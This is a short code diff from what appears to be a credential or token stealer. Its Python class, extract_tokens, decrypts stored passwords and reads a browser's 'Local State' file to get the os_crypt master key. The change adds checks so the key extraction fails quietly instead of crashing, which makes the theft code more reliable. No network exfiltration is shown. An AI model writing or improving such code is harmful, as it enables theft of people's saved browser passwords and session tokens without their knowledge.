@@ -118,6 +118,12 @@ class extract_tokens:
         return decrypted_pass
 
     def get_master_key(self, path: str) -> str:
+        if not os.path.exists(path):
+            return
+
+        if 'os_crypt' not in open(path, 'r', encoding='utf-8').read():
+            return
+
         with open(path, "r", encoding="utf-8") as f:
             c = f.read()
         local_state = json.loads(c)
